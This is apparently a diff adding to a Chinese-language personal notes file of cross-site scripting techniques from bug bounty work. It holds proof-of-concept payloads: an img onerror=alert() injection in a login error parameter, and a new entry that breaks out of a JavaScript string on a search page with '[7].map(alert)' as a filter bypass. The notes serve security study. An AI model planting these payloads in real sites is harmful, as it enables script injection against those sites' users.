@@ -70,3 +70,15 @@ target.com/login?error=<img src=1 onerror=alert()>
 # 8.个人信息中心处xss
 某个字段可以编辑进行存储xss
 https://hackerone.com/reports/1921606
+
+# 9.分析上下文构造payload的搜索xss
+search?brook
+![[Pasted image 20241020112514.png]]
+payload：
+```
+"，inertnalSearchTerm:[7].map(alert),num0fSearchResultsReturned:"b
+//输入时候要url编码符号，这里iner这个没有特殊含义
+```
+这里[].map()算是一个简单绕过思路吧
+弹窗
+![[Pasted image 20241020112736.png]]
